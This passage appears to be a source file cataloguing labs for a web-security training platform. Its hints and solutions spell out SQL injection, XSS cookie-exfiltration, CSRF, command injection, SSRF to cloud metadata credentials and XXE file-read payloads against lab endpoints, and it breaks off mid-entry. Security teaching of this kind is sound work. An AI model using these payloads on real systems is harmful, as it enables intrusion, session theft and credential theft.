'use strict';

/**
 * ZeroDay Academy lab catalog.
 *
 * This file is intentionally free of flag values. Flags are derived per user,
 * per challenge and per lab instance by services/flagService.js and are never
 * persisted in plaintext. Solutions are stored separately from the public
 * challenge document and are only returned after a verified solve.
 */

const LEVELS = {
  1: { label: 'Beginner', points: 100 },
  2: { label: 'Easy', points: 150 },
  3: { label: 'Intermediate', points: 250 },
  4: { label: 'Hard', points: 350 },
  5: { label: 'Advanced', points: 450 },
  6: { label: 'Insane', points: 600 }
};

const L = (entry) => {
  const level = entry.level;
  const meta = LEVELS[level];
  return {
    ...entry,
    difficulty: meta.label,
    points: entry.points || meta.points,
    labPath: `/labs/${entry.slug}`,
    published: true,
    archived: false
  };
};

const labs = [
  L({
    slug: 'sqli-login',
    title: 'Authentication Bypass via SQL Injection',
    domain: 'SQL Injection',
    category: 'Injection',
    level: 1,
    color: 'rose',
    summary: 'The staff login builds its SQL query with string concatenation.',
    briefing: 'ClientPortal Inc. concatenates the username and password fields directly into a SQL statement. Log in as the administrator without knowing the administrator password.',
    scenario: 'You have been asked to assess a small customer portal. The login form is the only exposed entry point, and the source code review ticket notes that the authentication query is assembled dynamically.',
    objectives: [
      'Identify that user input reaches a SQL query without parameterisation',
      'Craft a tautology payload that authenticates as the administrator',
      'Recover the per-instance flag from the authenticated admin session'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'SQLite'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-05',
    cwe: 'CWE-89',
    attackTechnique: 'T1190',
    hints: [
      'The query is SELECT * FROM sqli_accounts WHERE username = \'...\' AND password = \'...\'. You control both quoted strings.',
      'Try making the password clause evaluate to true without a valid password. A comment sequence can remove the rest of the query.'
    ],
    solution: 'Submit username admin with a password such as \' OR \'1\'=\'1\' -- The concatenated query becomes username = \'admin\' AND password = \'\' OR \'1\'=\'1\' --\', which returns the admin row. The lab then exposes the instance flag.'
  }),
  L({
    slug: 'sqli-union',
    title: 'UNION-Based SQL Injection',
    domain: 'SQL Injection',
    category: 'Injection',
    level: 2,
    color: 'rose',
    summary: 'A category search lets you UNION rows from an unrelated table.',
    briefing: 'The product catalogue filters by category and returns three columns. A separate secrets table exists in the same database. Use a UNION SELECT to make the search result include rows it was never designed to return.',
    scenario: 'The storefront search is backed by SQLite. The application exposes product names, categories and prices, but internal records are stored in the same database file.',
    objectives: [
      'Determine the column count of the original query',
      'Use UNION SELECT to retrieve data from sqli_secrets',
      'Extract the flag and submit it to the platform'
    ],
    prerequisites: ['sqli-login'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'SQLite'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-05',
    cwe: 'CWE-89',
    attackTechnique: 'T1190',
    hints: [
      'The query returns exactly three columns: name, category and price.',
      'Close the string, comment out the released filter, and UNION SELECT label, value, id FROM sqli_secrets.'
    ],
    solution: 'Search for category: \' UNION SELECT label, value, id FROM sqli_secrets -- The injected rows are rendered in the product table, including the flag stored in the value column.'
  }),
  L({
    slug: 'sqli-blind-boolean',
    title: 'Boolean-Based Blind SQL Injection',
    domain: 'SQL Injection',
    category: 'Injection',
    level: 3,
    color: 'rose',
    summary: 'An order lookup only reveals found or not found; extract data blind.',
    briefing: 'The order status lookup returns only a found/not-found indicator. A secret is stored in the sqli_secrets table. Build a boolean oracle and extract the secret one character at a time.',
    scenario: 'The fulfilment portal lets customers check an order by numeric ID. Errors are deliberately vague and no row data is returned.',
    objectives: [
      'Confirm that the numeric ID parameter is injectable',
      'Turn the found/not-found response into a boolean oracle',
      'Extract the blind-flag value with a script and submit it'
    ],
    prerequisites: ['sqli-union'],
    estimatedMinutes: 45,
    technology: ['Node.js', 'Express', 'SQLite'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-05',
    cwe: 'CWE-89',
    attackTechnique: 'T1190',
    hints: [
      'The query is SELECT * FROM sqli_orders WHERE id = <input> AND customer = \'guest\'. You control an unquoted numeric expression.',
      'Use AND (SELECT substr(value,1,1) FROM sqli_secrets WHERE label=\'blind-flag\')=\'Z\' and compare the found response.'
    ],
    solution: 'Inject 1 AND (SELECT unicode(substr(value,N,1)) FROM sqli_secrets WHERE label=\'blind-flag\') > 77 -- and binary-search the value. The per-instance flag is in sqli_secrets.label = blind-flag.'
  }),
  L({
    slug: 'sqli-time-blind',
    title: 'Time-Based Blind SQL Injection',
    domain: 'SQL Injection',
    category: 'Injection',
    level: 6,
    color: 'rose',
    summary: 'No boolean oracle at all: only response timing reveals data.',
    briefing: 'The username lookup returns an identical response for every input. A sleep() SQL function is available in the lab database. Use conditional delays to extract the time-flag value character by character.',
    scenario: 'A legacy account lookup service was hardened to stop returning errors and row counts. The database engine still evaluates user-controlled expressions.',
    objectives: [
      'Confirm that a conditional sleep influences response time',
      'Build a timing oracle with a measurable signal-to-noise ratio',
      'Extract a long secret without a boolean or error channel'
    ],
    prerequisites: ['sqli-blind-boolean'],
    estimatedMinutes: 90,
    technology: ['Node.js', 'Express', 'SQLite'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-05',
    cwe: 'CWE-89',
    attackTechnique: 'T1190',
    hints: [
      'The query is SELECT * FROM sqli_accounts WHERE username = \'<input>\'.',
      'sleep(ms) is registered as a SQL function. A conditional such as AND sleep(500) executes only when the surrounding condition is true.'
    ],
    solution: 'Inject x\' OR (SELECT unicode(substr(value,1,1)) FROM sqli_secrets WHERE label=\'time-flag\') > 77 AND sleep(800) -- and repeat for each character. The flag is the value of time-flag.'
  }),

  L({
    slug: 'reflected-xss',
    title: 'Reflected XSS in Search',
    domain: 'Cross-Site Scripting',
    category: 'Injection',
    level: 1,
    color: 'fuchsia',
    summary: 'A search page echoes your query straight back, unescaped.',
    briefing: 'The SecureShop search page reflects the q parameter into the response without HTML encoding. A non-HttpOnly proof cookie identifies the current lab instance. Execute JavaScript in the page and send the proof to the collector to reveal the flag.',
    scenario: 'A penetration test of a retail storefront found the search term rendered directly into the results heading. The client wants a proof of concept that demonstrates script execution.',
    objectives: [
      'Identify the reflected sink and its output context',
      'Execute a payload in the page context',
      'Exfiltrate the proof cookie to the lab collector'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'EJS', 'Browser JavaScript'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.3',
    wstgRef: 'WSTG-INPV-01',
    cwe: 'CWE-79',
    attackTechnique: 'T1059.007',
    hints: [
      'The q parameter is rendered with EJS unescaped output (<%- q %>).',
      'The proof cookie is named zda_xss_proof. A payload can call fetch(\'/labs/reflected-xss/collect?t=\'+document.cookie).'
    ],
    solution: 'Visit /labs/reflected-xss?q=<img src=x onerror="fetch(\'/labs/reflected-xss/collect?t=\'+encodeURIComponent(document.cookie))">. The collector validates the proof cookie and returns the instance flag.'
  }),
  L({
    slug: 'dom-xss-hash',
    title: 'DOM-Based XSS via URL Fragment',
    domain: 'Cross-Site Scripting',
    category: 'Injection',
    level: 2,
    color: 'fuchsia',
    summary: 'Client-side JavaScript writes location.hash into innerHTML.',
    briefing: 'A profile greeting reads the URL fragment and writes it into the DOM with innerHTML. The server never sees the fragment. Use the client-side sink to read the proof cookie and send it to the collector.',
    scenario: 'The marketing team added a personalised greeting that runs entirely in the browser. A code review flagged the use of location.hash as a DOM XSS source.',
    objectives: [
      'Locate the DOM source and sink in the page JavaScript',
      'Build a fragment payload that executes in the browser',
      'Use the XSS execution to reach the proof collector'
    ],
    prerequisites: ['reflected-xss'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'Browser JavaScript'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.3',
    wstgRef: 'WSTG-INPV-02',
    cwe: 'CWE-79',
    attackTechnique: 'T1059.007',
    hints: [
      'The greeting code calls innerHTML with decodeURIComponent(location.hash.slice(1)).',
      'An image error handler is a reliable execution vector: <img src=x onerror="...">.'
    ],
    solution: 'Open /labs/dom-xss-hash#<img src=x onerror="fetch(\'/labs/dom-xss-hash/collect?t=\'+encodeURIComponent(document.cookie))"> and the collector returns the flag.'
  }),
  L({
    slug: 'xss-filter-bypass',
    title: 'XSS Filter Bypass',
    domain: 'Cross-Site Scripting',
    category: 'Injection',
    level: 2,
    color: 'fuchsia',
    summary: 'A naive blacklist strips script tags but nothing else.',
    briefing: 'The display-name feature removes the literal string <script> and </script>. The filtering is a blacklist, not context-aware output encoding. Find a tag and event handler the filter never considered.',
    scenario: 'A developer attempted to fix an XSS report by deleting script tags from the input. The fix was deployed without a regression test.',
    objectives: [
      'Confirm the blacklist only removes script tags',
      'Choose an alternative HTML execution vector',
      'Exfiltrate the proof cookie to the collector'
    ],
    prerequisites: ['reflected-xss'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'Browser JavaScript'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.3',
    wstgRef: 'WSTG-INPV-01',
    cwe: 'CWE-79',
    attackTechnique: 'T1059.007',
    hints: [
      'Only the exact strings <script> and </script> are removed. SVG, img and body tags are untouched.',
      'The proof cookie is zda_xss_proof. Use an onerror or onload handler to run fetch().'
    ],
    solution: 'Use /labs/xss-filter-bypass?name=<img src=x onerror="fetch(\'/labs/xss-filter-bypass/collect?t=\'+encodeURIComponent(document.cookie))">. The na\u00efve filter leaves the tag intact.'
  }),
  L({
    slug: 'stored-xss',
    title: 'Stored XSS in Comments',
    domain: 'Cross-Site Scripting',
    category: 'Injection',
    level: 4,
    color: 'fuchsia',
    summary: 'A public comment box renders input unescaped for every visitor.',
    briefing: 'CommentBoard stores comments and renders them as raw HTML. A simulated moderator bot visits the board with a proof token cookie. Post a payload that executes in the bot browser and exfiltrates the token to the collector.',
    scenario: 'The community team reports a comment that appeared to run code when a moderator reviewed the queue. The bot runs in an isolated DOM and only sends same-origin requests.',
    objectives: [
      'Store an executable payload in the comment database',
      'Understand the difference between stored and reflected XSS',
      'Trigger the moderator bot and capture the flag from the validated proof'
    ],
    prerequisites: ['xss-filter-bypass'],
    estimatedMinutes: 45,
    technology: ['Node.js', 'Express', 'jsdom', 'Browser JavaScript'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.3',
    wstgRef: 'WSTG-INPV-02',
    cwe: 'CWE-79',
    attackTechnique: 'T1059.007',
    hints: [
      'Comments are rendered with <%- c.body %> and are scoped to your lab instance.',
      'The bot has a proof cookie named zda_bot_proof. A script that calls /labs/stored-xss/collect?t=<cookie> is enough.'
    ],
    solution: 'Post a comment containing <script>fetch(\'/labs/stored-xss/collect?t=\'+encodeURIComponent(document.cookie))</script>, then click Visit as moderator. The jsdom bot executes the script, sends the proof, and the lab reveals the flag.'
  }),
  L({
    slug: 'svg-upload-xss',
    title: 'Stored XSS via SVG Upload',
    domain: 'Cross-Site Scripting',
    category: 'Injection',
    level: 4,
    color: 'fuchsia',
    summary: 'SVG is XML, and XML can contain script.',
    briefing: 'The gallery accepts SVG avatars and serves them as image/svg+xml. Opening an SVG directly renders it as its own document and executes embedded scripts in the application origin.',
    scenario: 'A design team requested SVG support for crisp avatars. The upload endpoint only checks the extension, and the raw file is served from the application origin.',
    objectives: [
      'Upload an SVG that contains executable JavaScript',
      'Open the uploaded asset directly so the script runs',
      'Send the proof cookie to the collector and recover the flag'
    ],
    prerequisites: ['stored-xss'],
    estimatedMinutes: 40,
    technology: ['Node.js', 'Express', 'SVG', 'Browser JavaScript'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.3',
    wstgRef: 'WSTG-INPV-01',
    cwe: 'CWE-79',
    attackTechnique: 'T1059.007',
    hints: [
      'The raw endpoint serves the file with image/svg+xml, not as an <img> attachment.',
      'An SVG <script> element can read document.cookie and call fetch(). The proof cookie is zda_svg_proof.'
    ],
    solution: 'Upload an SVG containing <script>fetch(\'/labs/svg-upload-xss/collect?t=\'+encodeURIComponent(document.cookie))</script>, open /labs/svg-upload-xss/raw/<id> directly, and read the collector response.'
  }),

  L({
    slug: 'idor-invoices',
    title: 'IDOR: Anyone\'s Invoice Is Your Invoice',
    domain: 'Broken Access Control',
    category: 'Broken Access Control',
    level: 1,
    color: 'amber',
    summary: 'Invoices are fetched by a sequential number with no ownership check.',
    briefing: 'InvoiceHub returns an invoice by its sequential number. The endpoint does not verify that the invoice belongs to the signed-in customer. Walk the ID space to find another customer invoice containing the flag.',
    scenario: 'You are testing a billing portal as the guest customer. Your invoice list shows only your own invoice numbers.',
    objectives: [
      'Understand object-level authorization',
      'Enumerate adjacent invoice numbers',
      'Read another customer invoice and capture the flag'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'MongoDB'],
    owaspRef: 'A01:2021 - Broken Access Control',
    owaspApiRef: 'API1:2023 - BOLA',
    asvsRef: 'V4.1.3',
    wstgRef: 'WSTG-ATHZ-04',
    cwe: 'CWE-639',
    attackTechnique: 'T1078',
    hints: [
      'Your invoice links use the pattern /labs/idor-invoices/<number>.',
      'Nothing checks ownership. Try numbers near your own, and look at the notes field.'
    ],
    solution: 'Request /labs/idor-invoices/1002 and /labs/idor-invoices/1003. One of the neighboring invoices belongs to another customer and contains the flag in its notes.'
  }),
  L({
    slug: 'horizontal-privesc',
    title: 'Horizontal Privilege Escalation',
    domain: 'Broken Access Control',
    category: 'Broken Access Control',
    level: 1,
    color: 'amber',
    summary: 'Read another user\'s private note by changing a username in the URL.',
    briefing: 'You are signed in as alice. The notes endpoint accepts a username directly in the URL and returns that user\'s private note without comparing it to your session identity.',
    scenario: 'A note-taking service uses username-based URLs. The marketing site links to /note/alice as an example.',
    objectives: [
      'Recognise horizontal privilege escalation',
      'Enumerate usernames in the note route',
      'Read the administrator note and capture the flag'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'MongoDB'],
    owaspRef: 'A01:2021 - Broken Access Control',
    asvsRef: 'V4.1.3',
    wstgRef: 'WSTG-ATHZ-04',
    cwe: 'CWE-639',
    attackTechnique: 'T1078',
    hints: [
      'The current user is alice, but the URL does not have to say alice.',
      'Try /labs/horizontal-privesc/note/admin.'
    ],
    solution: 'Request /labs/horizontal-privesc/note/admin. The response returns the administrator private note with the instance flag.'
  }),
  L({
    slug: 'forced-browse-admin',
    title: 'Forced Browsing to a Hidden Admin Panel',
    domain: 'Broken Access Control',
    category: 'Broken Access Control',
    level: 1,
    color: 'amber',
    summary: 'An admin panel exists with no authentication, just no visible link.',
    briefing: 'Nothing in the UI links to the administration panel. Hidden paths are not access control. Enumerate the target and open the panel.',
    scenario: 'A pre-deployment review found a leftover admin route in the production build. The developers removed the navigation link and considered the issue resolved.',
    objectives: [
      'Use robots.txt and directory discovery techniques',
      'Identify the hidden admin route',
      'Access the panel and recover the flag'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express'],
    owaspRef: 'A01:2021 - Broken Access Control',
    asvsRef: 'V4.1.1',
    wstgRef: 'WSTG-ATHZ-02',
    cwe: 'CWE-425',
    attackTechnique: 'T1078',
    hints: [
      'Start with /labs/forced-browse-admin/robots.txt.',
      'The disallowed path is the admin panel.'
    ],
    solution: 'Read robots.txt, then open /labs/forced-browse-admin/panel-x29a. The page renders the flag without any authorization check.'
  }),
  L({
    slug: 'vertical-privesc',
    title: 'Vertical Privilege Escalation',
    domain: 'Broken Access Control',
    category: 'Broken Access Control',
    level: 3,
    color: 'amber',
    summary: 'A logged-in user can call an admin-only action directly.',
    briefing: 'The admin action is not linked in the UI for the user role, but the server never checks the caller\'s role. Invoke the endpoint directly and escalate vertically.',
    scenario: 'A SaaS dashboard exposes a role-gated button in one template. The API handler behind it was written before the role system was added.',
    objectives: [
      'Inspect the user interface and API for hidden privileged actions',
      'Invoke an admin action with a user session',
      'Capture the flag from the privileged response'
    ],
    prerequisites: ['forced-browse-admin'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express'],
    owaspRef: 'A01:2021 - Broken Access Control',
    owaspApiRef: 'API5:2023 - BFLA',
    asvsRef: 'V4.2.1',
    wstgRef: 'WSTG-ATHZ-03',
    cwe: 'CWE-285',
    attackTechnique: 'T1078',
    hints: [
      'The page source or JavaScript bundle may mention an admin endpoint.',
      'Try POST /labs/vertical-privesc/admin/grant-flag with your user session.'
    ],
    solution: 'Send POST /labs/vertical-privesc/admin/grant-flag as the guest user. The handler never checks the role and returns the flag.'
  }),
  L({
    slug: 'mass-assignment-role',
    title: 'Mass Assignment to Admin Role',
    domain: 'Broken Access Control',
    category: 'Broken Access Control',
    level: 2,
    color: 'amber',
    summary: 'A profile update endpoint merges your entire JSON body, unfiltered.',
    briefing: 'Only displayName is exposed in the profile form, but the update handler merges the full JSON body into your profile object. Add a privileged field the UI never sends.',
    scenario: 'A profile editor accepts a JSON blob and uses Object.assign to apply it. The client sends displayName, but the server accepts any key.',
    objectives: [
      'Observe the shape of the profile update request',
      'Add a role field that the UI does not expose',
      'Refresh the profile and capture the flag'
    ],
    prerequisites: ['horizontal-privesc'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'JSON'],
    owaspRef: 'A01:2021 - Broken Access Control',
    owaspApiRef: 'API3:2023 - Broken Object Property Level Authorization',
    asvsRef: 'V4.2.1',
    wstgRef: 'WSTG-ATHZ-03',
    cwe: 'CWE-915',
    attackTechnique: 'T1078',
    hints: [
      'The form posts a JSON document to /labs/mass-assignment-role/update.',
      'Include "role":"admin" alongside displayName.'
    ],
    solution: 'Submit {"displayName":"guest","role":"admin"} to /labs/mass-assignment-role/update. The handler assigns every key, and the admin profile displays the flag.'
  }),
  L({
    slug: 'file-access-idor',
    title: 'IDOR on File Downloads',
    domain: 'Broken Access Control',
    category: 'Broken Access Control',
    level: 2,
    color: 'amber',
    summary: 'Reports are fetched by a predictable object ID with no ownership check.',
    briefing: 'Your portal lists two reports by MongoDB ObjectId. The download endpoint fetches any file by ID. Adjacent documents were inserted at the same time; enumerate nearby IDs to find an internal report.',
    scenario: 'A finance team\'s reporting portal embeds document IDs in download links. The IDs are opaque-looking but generated sequentially by MongoDB.',
    objectives: [
      'Understand why opaque IDs are not authorization',
      'Enumerate object IDs around your own files',
      'Download the internal report and capture the flag'
    ],
    prerequisites: ['idor-invoices'],
    estimatedMinutes: 30,
    technology: ['Node.js', 'Express', 'MongoDB'],
    owaspRef: 'A01:2021 - Broken Access Control',
    owaspApiRef: 'API1:2023 - BOLA',
    asvsRef: 'V4.1.3',
    wstgRef: 'WSTG-ATHZ-04',
    cwe: 'CWE-639',
    attackTechnique: 'T1078',
    hints: [
      'MongoDB ObjectIds encode a timestamp and a counter. Neighboring IDs differ in the last bytes.',
      'The files were inserted in order: guest report, internal report, internal report. Try IDs adjacent to the one in your link.'
    ],
    solution: 'Increment or decrement the final hex portion of your report ID and request /labs/file-access-idor/download/<id>. One adjacent object is the internal report containing the flag.'
  }),

  L({
    slug: 'csrf-email-change',
    title: 'CSRF: Silent Email Takeover',
    domain: 'CSRF',
    category: 'Broken Access Control',
    level: 2,
    color: 'red',
    summary: 'The email-change form has no CSRF token.',
    briefing: 'The account email change endpoint accepts a cross-site POST with no anti-CSRF token and no origin validation. Build an auto-submitting exploit page, then trigger the simulated victim visit.',
    scenario: 'A customer account page allows email changes. The security team suspects the form can be embedded on an attacker site.',
    objectives: [
      'Build a cross-site form that targets the email-change endpoint',
      'Trigger the simulated victim browser',
      'Verify the victim email changed and capture the flag'
    ],
    prerequisites: ['reflected-xss'],
    estimatedMinutes: 30,
    technology: ['Node.js', 'Express', 'HTML'],
    owaspRef: 'A01:2021 - Broken Access Control',
    asvsRef: 'V3.5.1',
    wstgRef: 'WSTG-SESS-05',
    cwe: 'CWE-352',
    attackTechnique: 'T1185',
    hints: [
      'The exploit page is hosted at /labs/csrf-email-change/exploit.',
      'Use a form with method POST, action /labs/csrf-email-change/change-email, and an email value containing attacker.'
    ],
    solution: 'Craft an HTML form that posts email=attacker@evil.test to /labs/csrf-email-change/change-email and auto-submits. Save it with the Craft Exploit form, then click Simulate Victim Visit. The victim email changes and the flag is revealed.'
  }),
  L({
    slug: 'csrf-get-based',
    title: 'CSRF via State-Changing GET',
    domain: 'CSRF',
    category: 'Broken Access Control',
    level: 1,
    color: 'red',
    summary: 'A funds transfer is wired to a plain GET request.',
    briefing: 'The transfer endpoint changes state on a GET request and accepts a destination and amount from the query string. A single image tag on any page can trigger it for a logged-in victim.',
    scenario: 'A banking demo implements transfers as links. The security review asks whether a third-party page can initiate one.',
    objectives: [
      'Identify a state-changing GET endpoint',
      'Trigger the transfer without a form or JavaScript',
      'Capture the flag after the victim balance changes'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express'],
    owaspRef: 'A01:2021 - Broken Access Control',
    asvsRef: 'V3.5.1',
    wstgRef: 'WSTG-SESS-05',
    cwe: 'CWE-352',
    attackTechnique: 'T1185',
    hints: [
      'The transfer route accepts to and amount in the query string.',
      'Visit /labs/csrf-get-based/transfer?to=attacker&amount=500 directly.'
    ],
    solution: 'Request /labs/csrf-get-based/transfer?to=attacker&amount=500. The GET changes the balance, sets the attacker transfer marker, and the index page reveals the flag.'
  }),

  L({
    slug: 'cmd-injection',
    title: 'OS Command Injection in Ping Tool',
    domain: 'Command Injection',
    category: 'Injection',
    level: 2,
    color: 'orange',
    summary: 'A diagnostics tool passes unsanitised input to a shell.',
    briefing: 'The network diagnostics page builds a ping command from the host field. Break out of the intended argument and execute a second command that reads the flag file from the tool working directory.',
    scenario: 'An internal appliance exposes a ping diagnostic. The firmware was built quickly, and the host value is interpolated into a shell command.',
    objectives: [
      'Identify a shell metacharacter injection point',
      'Execute a second command in the target context',
      'Read flag.txt and submit the flag'
    ],
    prerequisites: ['sqli-login'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'Command line'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.8',
    wstgRef: 'WSTG-INPV-12',
    cwe: 'CWE-78',
    attackTechnique: 'T1059',
    hints: [
      'The command is ping -c 1 <host>. Semicolons and command substitutions are interpreted by the shell.',
      'Try 127.0.0.1; cat flag.txt or 127.0.0.1 && cat flag.txt.'
    ],
    solution: 'Submit 127.0.0.1; cat flag.txt in the host field. The virtual shell executes both commands and prints the flag from the lab working directory.'
  }),
  L({
    slug: 'ssrf-metadata',
    title: 'SSRF to Cloud Metadata Service',
    domain: 'SSRF',
    category: 'Server-Side Request Forgery',
    level: 3,
    color: 'cyan',
    summary: 'An avatar-from-URL importer fetches any URL server-side.',
    briefing: 'The avatar importer fetches a URL from the server and returns the response body. A simulated cloud metadata service is reachable only from the server network at 169.254.169.254. Walk the metadata paths to recover the instance credential flag.',
    scenario: 'A profile editor accepts an avatar URL. The backend fetches the image to validate its size, and the URL is not restricted.',
    objectives: [
      'Confirm server-side fetching of user-controlled URLs',
      'Enumerate the simulated metadata service paths',
      'Retrieve the credential document containing the flag'
    ],
    prerequisites: ['cmd-injection'],
    estimatedMinutes: 35,
    technology: ['Node.js', 'Express', 'Cloud metadata'],
    owaspRef: 'A10:2021 - Server-Side Request Forgery',
    owaspApiRef: 'API7:2023 - SSRF',
    asvsRef: 'V12.6.1',
    wstgRef: 'WSTG-INPV-19',
    cwe: 'CWE-918',
    attackTechnique: 'T1552.005',
    hints: [
      'Metadata services expose directory listings first. Start at http://169.254.169.254/latest/meta-data/.',
      'Follow the iam/security-credentials/ path to the role name, then request the role credentials.'
    ],
    solution: 'Submit http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the role name, then fetch the role path. The simulated credential JSON includes the flag.'
  }),
  L({
    slug: 'ssrf-webhook',
    title: 'SSRF via Webhook Tester',
    domain: 'SSRF',
    category: 'Server-Side Request Forgery',
    level: 3,
    color: 'cyan',
    summary: 'A webhook tester reaches an internal-only admin API.',
    briefing: 'The webhook tester fetches any URL. An internal admin service resolves only inside the lab network at internal-admin.local. Enumerate its endpoints and read the flag.',
    scenario: 'A payment integration page lets merchants test webhook delivery. The test runs from the application server, not the browser.',
    objectives: [
      'Identify that the tester performs server-side requests',
      'Reach an internal-only host through the SSRF',
      'Read the internal admin flag endpoint'
    ],
    prerequisites: ['ssrf-metadata'],
    estimatedMinutes: 35,
    technology: ['Node.js', 'Express', 'Internal services'],
    owaspRef: 'A10:2021 - Server-Side Request Forgery',
    owaspApiRef: 'API7:2023 - SSRF',
    asvsRef: 'V12.6.1',
    wstgRef: 'WSTG-INPV-19',
    cwe: 'CWE-918',
    attackTechnique: 'T1552.005',
    hints: [
      'Try http://internal-admin.local/internal/admin/status first.',
      'The flag endpoint is under the same internal path namespace.'
    ],
    solution: 'Submit http://internal-admin.local/internal/admin/flag as the webhook URL. The internal handler returns JSON containing the flag.'
  }),
  L({
    slug: 'ssrf-pdf-generator',
    title: 'SSRF via PDF Generation',
    domain: 'SSRF',
    category: 'Server-Side Request Forgery',
    level: 3,
    color: 'cyan',
    summary: 'An invoice PDF renderer fetches image sources server-side.',
    briefing: 'The invoice renderer parses <img src> values from your HTML and fetches them from the server to compose the PDF. A simulated internal config host at pdf-internal.local contains the flag. Point an image source at it.',
    scenario: 'A billing team generates PDF invoices from customer HTML. Images are fetched so they appear in the final document.',
    objectives: [
      'Locate the server-side image fetch',
      'Point the fetcher at an internal-only host',
      'Read the internal config and capture the flag'
    ],
    prerequisites: ['ssrf-webhook'],
    estimatedMinutes: 35,
    technology: ['Node.js', 'Express', 'HTML rendering'],
    owaspRef: 'A10:2021 - Server-Side Request Forgery',
    owaspApiRef: 'API7:2023 - SSRF',
    asvsRef: 'V12.6.1',
    wstgRef: 'WSTG-INPV-19',
    cwe: 'CWE-918',
    attackTechnique: 'T1552.005',
    hints: [
      'Only the first <img src="..."> is fetched by the renderer.',
      'The internal config is at http://pdf-internal.local/config.'
    ],
    solution: 'Submit invoice HTML containing <img src="http://pdf-internal.local/config">. The renderer fetches the internal config and displays the response body, including the flag.'
  }),

  L({
    slug: 'xxe-profile-import',
    title: 'XXE via Profile Import',
    domain: 'XXE',
    category: 'Security Misconfiguration',
    level: 3,
    color: 'lime',
    summary: 'A profile importer parses XML with external entities enabled.',
    briefing: 'The profile importer resolves SYSTEM entities in uploaded XML. Define an entity that reads a local file inside the lab sandbox and reflect it through the displayName field.',
    scenario: 'A CRM migration tool accepts an XML profile export. The parser is a custom lightweight implementation that supports external entities.',
    objectives: [
      'Confirm that DOCTYPE and SYSTEM entities are processed',
      'Read a file from the lab working directory',
      'Reflect the file contents into the profile response'
    ],
    prerequisites: ['ssrf-pdf-generator'],
    estimatedMinutes: 35,
    technology: ['Node.js', 'Express', 'XML'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V5.5.2',
    wstgRef: 'WSTG-INPV-07',
    cwe: 'CWE-611',
    attackTechnique: 'T1190',
    hints: [
      'Define <!ENTITY xxe SYSTEM "file://secret.txt"> and reference &xxe; inside displayName.',
      'The lab sandbox contains secret.txt in the import working directory.'
    ],
    solution: 'Submit XML with <!ENTITY xxe SYSTEM "file://secret.txt"> and <displayName>&xxe;</displayName>. The importer resolves the entity and renders the flag.'
  }),
  L({
    slug: 'xxe-svg-upload',
    title: 'XXE via SVG Upload',
    domain: 'XXE',
    category: 'Security Misconfiguration',
    level: 3,
    color: 'lime',
    summary: 'SVG avatar processing resolves external entities too.',
    briefing: 'The SVG sanitizer parses XML with the same unsafe entity resolver as the profile importer. Use a DOCTYPE entity inside the SVG title to read a local flag file.',
    scenario: 'An avatar pipeline extracts the SVG title for accessibility text. It uses a homegrown XML helper rather than a hardened parser.',
    objectives: [
      'Treat SVG as XML rather than an image',
      'Inject a SYSTEM entity into the SVG document',
      'Read flag.txt through the reflected title'
    ],
    prerequisites: ['xxe-profile-import'],
    estimatedMinutes: 35,
    technology: ['Node.js', 'Express', 'SVG', 'XML'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V5.5.2',
    wstgRef: 'WSTG-INPV-07',
    cwe: 'CWE-611',
    attackTechnique: 'T1190',
    hints: [
      'The parser scans for <!ENTITY name SYSTEM "uri"> and substitutes &name;.',
      'Use file://flag.txt and put &xxe; inside <title>.'
    ],
    solution: 'Submit an SVG with <!ENTITY xxe SYSTEM "file://flag.txt"> and <title>&xxe;</title>. The importer resolves the entity and displays the flag in the alt text.'
  }),
  L({
    slug: 'xxe-oob-exfil',
    title: 'Blind XXE via Out-of-Band Exfiltration',
    domain: 'XXE',
    category: 'Security Misconfiguration',
    level: 6,
    color: 'lime',
    summary: 'Nothing is reflected: exfiltrate data through a self-hosted DTD.',
    briefing: 'The importer processes parsed XML but returns no entity values. Host a malicious DTD on the lab collector endpoint, have the target fetch it, and make the DTD send a local file to your collector. Recover the flag from the out-of-band callback.',
    scenario: 'A hardened import service suppresses parse errors and never reflects entity content. The XML parser still resolves external DTDs.',
    objectives: [
      'Design a two-stage blind XXE payload',
      'Host a malicious DTD that reads a local file and builds an exfiltration URL',
      'Capture the out-of-band request and extract the flag'
    ],
    prerequisites: ['xxe-svg-upload'],
    estimatedMinutes: 90,
    technology: ['Node.js', 'Express', 'XML', 'DTD'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V5.5.2',
    wstgRef: 'WSTG-INPV-07',
    cwe: 'CWE-611',
    attackTechnique: 'T1190',
    hints: [
      'The DTD must be fetched by the target, so use the lab evil.dtd endpoint as the SYSTEM identifier.',
      'Inside the DTD, define an entity for db_credentials.conf and reference it in a second SYSTEM URL that points to /collector?data=...'
